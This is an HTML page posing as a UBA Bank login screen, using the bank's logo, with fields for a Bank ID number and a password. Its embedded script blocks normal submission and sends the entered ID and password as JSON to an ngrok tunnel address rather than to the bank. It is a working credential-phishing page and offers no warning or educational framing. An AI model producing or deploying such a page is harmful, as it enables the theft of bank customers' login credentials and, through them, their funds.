<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>UBA Bank Login</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #f2f2f2;
    }

    .container {
      width: 400px;
      margin: 50px auto;
      background-color: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    img {
      width: 150px;
      height: auto;
    }

    .form-group {
      margin-bottom: 10px;
    }

    label {
      display: block;
      margin-bottom: 5px;
    }

    input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .btn {
      width: 100%;
      background-color: #007bff;
      color: #fff;
      padding: 10px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.ubabank.com/assets/images/uba-logo.png" alt="UBA Bank Logo">
    </div>

    <h2>UBA Bank Login</h2>

    <form id="loginForm">
      <div class="form-group">
        <label for="bankID">Bank ID Number:</label>
        <input type="text" id="bankID" name="bankID" class="form-control" required>
      </div>

      <div class="form-group">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" class="form-control" required>
      </div>

      <button type="submit" class="btn">Login</button>
    </form>

    <script>
      const form = document.getElementById('loginForm');

      form.addEventListener('submit', (event) => {
        event.preventDefault();

        const bankID = document.getElementById('bankID').value;
        const password = document.getElementById('password').value;

        const loginData = {
          bankID,
          password
        };

        fetch('https://ngrok-url.com/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(loginData)
        })
          .then(response => {
            // Handle the response from the server
            console.log('Login data sent successfully');
          })
          .catch(error => {
            // Handle any errors that occur during the fetch
            console.error('Error sending login data:', error);
          });
      });
    </script>
  </div>
</body>
</html>
